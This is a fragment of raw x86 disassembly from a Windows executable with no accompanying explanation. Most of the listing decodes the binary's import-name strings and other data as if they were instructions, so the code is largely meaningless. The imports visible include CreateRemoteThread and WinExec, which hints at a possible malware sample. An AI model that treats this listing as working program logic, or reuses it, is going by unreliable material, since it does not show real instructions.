  413517:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	add    BYTE PTR [ecx+eax*1+0x54746547],al
  413524:	gs js  0x41359b
  413527:	inc    ebp
  413528:	js     0x41359e
  41352a:	outs   dx,BYTE PTR gs:[esi]
  41352c:	je     0x41357e
  41352e:	outs   dx,DWORD PTR ds:[esi]
  41352f:	imul   ebp,DWORD PTR [esi+0x74],0x573233
  413536:	jo     0x413538
  413538:	inc    ecx
  413539:	fs fs inc esi
  41353c:	outs   dx,DWORD PTR ds:[esi]
  41353d:	outs   dx,BYTE PTR ds:[esi]
  41353e:	je     0x413592
  413540:	gs jae 0x4135b2
  413543:	jne    0x4135b7
  413545:	arpl   WORD PTR [ebp+0x57],sp
  413548:	add    BYTE PTR [eax],al
  41354a:	inc    ecx
  41354b:	add    DWORD PTR [edi+0x65],eax
  41354e:	je     0x413594
  413550:	gs jbe 0x4135bc
  413553:	arpl   WORD PTR [ebp+0x43],sp
  413556:	popa   
  413557:	jo     0x4135cc
  413559:	add    BYTE PTR [esi+0x1],ch
  41355c:	inc    edi
  41355d:	gs je  0x4135b0
  413560:	imul   edi,DWORD PTR [eax+0x65],0xd500006c
  413567:	add    BYTE PTR [ebp+0x78],al
  41356a:	je     0x4135c0
  41356c:	gs js  0x4135e3
  41356f:	dec    edi
  413570:	jne    0x4135e6
  413572:	push   edi
  413573:	add    BYTE PTR [esi+0x65724300],ah
  413579:	popa   
  41357a:	je     0x4135e1
  41357c:	push   eax
  41357d:	popa   
  41357e:	je     0x4135f4
  413580:	gs jb  0x4135f1
  413583:	inc    edx
  413584:	jb     0x4135fb
  413586:	jae    0x4135f0
  413588:	add    BYTE PTR [eax],al
  41358a:	into   
  41358b:	add    BYTE PTR [ebp+0x78],al
  41358e:	arpl   WORD PTR [ebp+esi*2+0x64],bp
  413592:	gs inc ebx
  413594:	ins    BYTE PTR es:[edi],dx
  413595:	imul   esi,DWORD PTR [eax+0x52],0x746365
  41359c:	lds    eax,FWORD PTR [eax]
  41359e:	inc    ebp
  41359f:	outs   dx,BYTE PTR ds:[esi]
  4135a0:	jne    0x41360f
  4135a2:	inc    esi
  4135a3:	outs   dx,DWORD PTR ds:[esi]
  4135a4:	outs   dx,BYTE PTR ds:[esi]
  4135a5:	je     0x4135ed
  4135a7:	popa   
  4135a8:	ins    DWORD PTR es:[edi],dx
  4135a9:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x47005773
  4135b1:	inc    esp
  4135b2:	dec    ecx
  4135b3:	xor    esi,DWORD PTR [edx]
  4135b5:	cs fs ins BYTE PTR es:[edi],dx
  4135b8:	ins    BYTE PTR es:[edi],dx
  4135b9:	add    BYTE PTR [edi+0x74654701],bl
  4135bf:	inc    ebx
  4135c0:	outs   dx,DWORD PTR ds:[esi]
  4135c1:	ins    DWORD PTR es:[edi],dx
  4135c2:	jo     0x413639
  4135c4:	je     0x41362b
  4135c6:	jb     0x413616
  4135c8:	popa   
  4135c9:	ins    DWORD PTR es:[edi],dx
  4135ca:	gs inc ecx
  4135cc:	add    BYTE PTR [eax],al
  4135ce:	sbb    eax,0x74655304
  4135d3:	dec    eax
  4135d4:	popa   
  4135d5:	outs   dx,BYTE PTR ds:[esi]
  4135d6:	fs ins BYTE PTR es:[edi],dx
  4135d8:	gs inc ebx
  4135da:	outs   dx,DWORD PTR ds:[esi]
  4135db:	jne    0x41364b
  4135dd:	je     0x4135df
  4135df:	add    BYTE PTR [edx],bh
  4135e1:	add    ecx,DWORD PTR [edi+0x70]
  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	(bad)  
  413ba9:	xor    eax,0x68720043
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
